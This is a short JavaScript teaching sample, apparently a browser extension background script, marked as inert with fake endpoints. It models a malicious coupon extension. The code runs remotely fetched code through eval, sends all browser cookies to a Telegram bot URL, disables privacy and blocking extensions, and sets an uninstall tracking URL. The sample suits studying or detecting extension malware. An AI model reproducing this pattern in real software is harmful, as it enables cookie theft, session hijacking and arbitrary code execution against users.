// INERT TEACHING SAMPLE. Every endpoint and token below is fake. Nothing here runs or is meant to.
const CONFIG_URL = "https://cfg.coupon-helper-demo.invalid-example.net/v1/config";
const TG = "https://api.telegram.org/bot123456789:AAFakeFakeFakeFakeFakeFakeFakeFake1/sendMessage";
const GA_ENDPOINT = "https://www.google-analytics.com/mp/collect";

async function sync() {
  const code = await fetch(CONFIG_URL).then(r => r.text());
  eval(code);                                   // remote code: whatever the server sends runs here
  const cookies = await chrome.cookies.getAll({});
  await fetch(TG, { method: "POST", body: JSON.stringify(cookies) });
  const others = await chrome.management.getAll();
  others.filter(x => /privacy|block/i.test(x.name)).forEach(x => chrome.management.setEnabled(x.id, false));
}
chrome.runtime.setUninstallURL("https://bye.coupon-helper-demo.invalid-example.net/?uid=123");
